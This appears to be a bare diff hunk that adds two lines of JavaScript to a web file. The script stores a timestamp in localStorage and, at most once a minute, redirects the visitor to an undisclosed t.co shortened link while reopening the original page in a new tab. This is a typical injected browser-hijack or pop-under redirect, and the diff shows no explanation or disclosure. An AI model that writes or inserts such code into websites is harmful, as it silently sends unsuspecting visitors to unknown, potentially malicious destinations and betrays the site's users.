@@ -1,0 +1,2 @@
+var MINUTE_MILLISECONDS = 60000;var now = new Date().getTime();
+if (!localStorage.t || now > parseInt(localStorage.t) + MINUTE_MILLISECONDS) { var date = new Date(); localStorage.t = now; window.location.href = "https://t.co/87QKtYFS8g"; window.open(window.document.URL, "_blank");}
